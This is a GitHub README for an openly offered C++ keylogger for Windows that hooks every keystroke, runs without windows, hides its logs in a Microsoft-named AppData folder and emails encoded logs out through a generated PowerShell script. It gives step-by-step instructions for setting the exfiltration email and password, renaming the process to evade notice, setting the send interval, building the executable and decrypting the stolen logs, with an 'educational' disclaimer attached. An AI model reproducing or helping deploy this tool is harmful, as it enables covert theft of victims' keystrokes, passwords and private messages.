# Cpp-Keylogger (Completed)
Advanced keylogger made in C++ that works on Window 7, 8, 8.1, And 10 - **Use at your own discretion** <br/><br/>
This is a keylogger I learned from Udemy for educational purposes. Please do not use this code for illegal or immoral purposes and keep it open source! The project also includes a decryption program will accepts an encrypted log file and translates it to a human readable language. <br/>
If you would like to take the course yourself, check it out [here](https://www.udemy.com/how-to-create-an-advanced-keylogger-from-scratch-for-windows).

Table of Contents
=================

   * [Features](#features)
   * [Important Information](#important-information)
      * [Prerequisites](#prerequisites)
      * [Installing](#installing)
   * [Setting it up](#setting-it-up)
      * [Email](#email)
      * [Configuring the Source Email](#configuring-the-source-email)
         * [Other Emails](#other-emails)
         * [Configuring Other Emails](#configuring-other-emails)
   * [Decrypting the log files](#decrypting-the-log-files)
   * [Customization](#customization)
      * [Naming the Process](#naming-the-process)
      * [Setting the Interval Time](#setting-the-interval-time)
      * [Formatting Each Read Letter](#formatting-each-read-letter)
      * [Excluding Certain Keys](#excluding-certain-keys)
   * [Deploying the Keylogger From the Source Code](#deploying-the-keylogger-from-the-source-code)
   * [License](#license)
   * [Disclaimer](#disclaimer)
   * [Acknowledgments](#acknowledgments)

## Features
  * Lots of comments in each of the source files for the user
  * Low-resource usage/non-intensive process and generates no windows when ran
  * Asynchronous execution of processes
  * Capture all keystrokes using system hooks
  * Automatically log the time and date when a log file is produced
  * Uses Base64 encryption with slight modifications and encodes the log multiple times
  * Generates and invokes a powershell script that can attach the encrypted log and email it
  * Lots of customization options in the source code for user to modify:
    * Name of the process
    * Email to send from and send to
    * Time between each log file generation
    * Format how keys are recorded
    * Keys to exclude from recording
    
## Important Information
  * Log files by default are stored in C:\Users\($User)\AppData\Roaming\Microsoft\CLR
  * AppLog files are produced in the location when the keylogger is ran for debugging purposes
  * Problems may occur if the Keylogger in ran multiple times when one is still running
  * Default name to look for in the task manager to end the keylogger process is Keylogger.exe

### Prerequisites

What things you need to install the software and how to install them

```
* Visual Studio preferably or any IDE of your choice
* C++11 standards must be enabled and if using GCC compilter, -mwindows flag needs to be checked

```

### Installing

A step by step series of examples that tell you have to get a development environment running

Download the repository using either bash or the browser

```
git clone https://github.com/htmercury/Cpp-Keylogger
```

Open the solution file in Visual Studio using the sln file

```
located at ..\Cpp-Keylogger\Keylogger.sln
```

For other IDEs, make a project that includes all source and header files

```
located at ..\Cpp-Keylogger\Keylogger
```

## Setting it up
Listed below are various options the user can interact with the source code for their specific usage.

## Email
Required if user wants the log to be sent to an email.

Open SendMail.h
```
located at ..\Cpp-Keylogger\Keylogger\SendMail.h
```
Edit line 16 for where the log should be sent from (default: gmail only, look at Other Emails section for changing that)
```
line 16: #define X_EM_TO "our.destination@email.address" // change the string to source email
```
Edit line 17 for where the log should be sent to (can be same as above or any other email is fine)
```
line 17: #define X_EM_FROM "Address of sender" // change the string to destination email
```
Edit line 18 for powershell to login to source email (required for email to be sent)
```
line 18: X_EM_PASS "password" // change the string to password of source email
```
## Configuring the Source Email
For gmail, allow less secure apps access your source email so the program can construct and send the email.
The steps needed to do this is documented [here](https://support.google.com/accounts/answer/6010255?hl=en) on Google Support. <br/>
Refer to Other Emails section if the source email is not gmail.

**SKIP OTHER EMAILS SECTION IF SOURCE EMAIL IS GMAIL**

## Other Emails
OPTIONAL: If you want to use another email other than gmail as the source email, then follow these steps.

Open SendMail.h
```
located at ..\Cpp-Keylogger\Keylogger\SendMail.h
```
Edit line 39 with your email port number which can be searched up
```
line 39: "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
```

### Configuring Other Emails
Look up permissions respectively for your source email that allow less secure apps to access that source email.

## Decrypting the log files
Follow these steps to decrypt any received log files

Open the Decryption program solution with Visual Studio
```
located at ..\Cpp-Keylogger\Keylogger-Decrypt.sln
```
For other IDEs, make a project that includes all source files
```
located at ..\Cpp-Keylogger\Keylogger-Decrypt\
```
Build the solution, and find the exe (default: located at ../Cpp-Keylogger/Debug)
```
located at ..\Cpp-Keylogger\Debug\Keylogger-Decrypt.exe
```
Open a command prompt window at that directory
```
cd ..\Cpp-Keylogger\Debug\
```
Run the decryption program which takes in a input file and a output file which contains the decrypted contents
```
.\Keylogger-Decrypt.exe "inputfile.log" "outputfile.log"
```

## Customization
OPTIONAL changes the user can make to the source code to fit their needs.

## Naming the Process
The name of the process can simply be changed by renaming the .exe file of the built solution

Build the solution
```
Build -> Build Solution
The .exe file should be located by default in ..\Cpp-Keylogger\Debug\Keylogger.exe
```
Rename the built Keylogger.exe file

## Setting the Interval Time
Here, the user can set the interval at which each log file is created and sent

Open KeybHook.h
```
located at ..\Cpp-Keylogger\Keylogger\KeybHook.h
```
Edit line 36 with the desired time (default is 30 seconds)
```
line 36: Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite); // change the second argument to desired time (milliseconds)
```
## Formatting Each Read Letter
Here, the user can set how the log file formats the read keys

Open Helper.h
```
located at ..\Cpp-Keylogger\Keylogger\Helper.h
```
Edit lines 77 - 83 to change how single keys are formated
```
line 77: void WriteAppLog(const std::string &s) // function responsible for format of each key in log (default: [a][b][c])
```

## Excluding Certain Keys
Here, the user can exclude keys they don't want to be logged

Open KeybHook.h
```
located at ..\Cpp-Keylogger\Keylogger\KeybHook.h
```
Take a look at lines 40 - 72
```
line 40: LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) // function responsible for reading and handling certain key presses
```
Add in necessary if statements and desired format when a certain key is pressed (ex: by default pressing enter inserts "\n" to the log)

## Deploying the Keylogger From the Source Code
Here, the user builds the solution to an .exe file

Open the solution file in Visual Studio using the sln file
```
located at ..\Cpp-Keylogger\Keylogger.sln
```
For other IDEs, make a project that includes all source and header files
```
located at ..\Cpp-Keylogger\Keylogger
```
Build the solution
```
Build -> Build Solution
The .exe file should be located by default in ..\Cpp-Keylogger\Debug\Keylogger.exe
```


## License
This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details

## Disclaimer
Any usage of this keylogger on a computer that is not owned by you or do not have permissions, **YOU ARE RESPONSIBLE FOR THE OUTCOME**. Not me.

## Acknowledgments
Hat tip to Ermin's amazing course on creating a keylogger, check out his profile and other courses [here!](https://www.udemy.com/user/erminkreponic/)
